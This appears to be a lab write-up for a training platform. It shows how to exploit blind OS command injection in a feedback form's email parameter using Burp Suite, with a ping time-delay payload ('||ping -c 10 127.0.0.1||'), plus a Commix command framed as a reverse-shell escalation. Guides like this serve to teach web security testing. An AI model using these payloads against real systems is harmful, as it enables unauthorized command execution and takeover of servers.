# 🛡️ Lab Guide: Blind OS Command Injection with Time Delays

This guide walks you through exploiting a **blind OS command injection vulnerability** in a web application's feedback form using **Burp Suite**. By injecting a time-delay command, you'll confirm the vulnerability and explore a reverse shell payload. Let’s dive into the action! 🚀

---

## 📋 Objective
Exploit a blind OS command injection vulnerability in the `email` parameter of a feedback submission form by injecting a time-delay command and observing the response delay.

---

## 🛠️ Tools Needed
- **Burp Suite** (with Burp’s browser)
- **Commix** (for reverse shell payload)
- Basic understanding of OS command injection and HTTP requests

---

## 📝 Step-by-Step Instructions

### 1️⃣ Intercept the Feedback Submission Request
- Open **Burp Suite** and ensure **Intercept** is on.
- In **Burp’s browser**, navigate to the feedback submission form (e.g., `https://YOUR-LAB-ID.web-security-academy.net/feedback`).
- Fill out the form with sample data (e.g., `name=mohamed`, `email=ahmed@gmail.com`, `subject=asdasfsd`, `message=fdsaf`) and submit it.
- In **Proxy > HTTP history**, locate the POST request to `/feedback/submit`.
- Note the `csrf` token and session cookie in the request (e.g., `csrf=KaIao3FiYLLI7NU7Q2YtY4xGTce04G58`, cookie=`2trBX11Y1QxjAiiknoOHqwjzRVdtnbuK`).

### 2️⃣ Inject a Time-Delay Command
- **Right-click** the feedback submission request in **Proxy > HTTP history** and select **Send to Repeater**.
- In **Repeater**, modify the `email` parameter to:
  ```
  email=x||ping+-c+10+127.0.0.1||
  ```
- Submit the request and measure the response time.
- **Observation**: The response takes approximately **10 seconds** to return, indicating successful execution of the `ping` command (10 pings to localhost).

### 3️⃣ Explore a Reverse Shell (Optional)
- To escalate the attack, use **Commix** to attempt a reverse shell. Run the following command, replacing the URL, data, and cookie with your lab-specific values:
  ```bash
  commix \
  -u "https://YOUR-LAB-ID.web-security-academy.net/feedback/submit" \
  --data="csrf=YOUR-CSRF-TOKEN&name=mohamed&email=ahmed%40gmail.com&subject=asdasfsd&message=fdsaf" \
  --cookie="YOUR-SESSION-COOKIE"
  ```
- **Note**: This step is for advanced exploration and may not be required to solve the lab.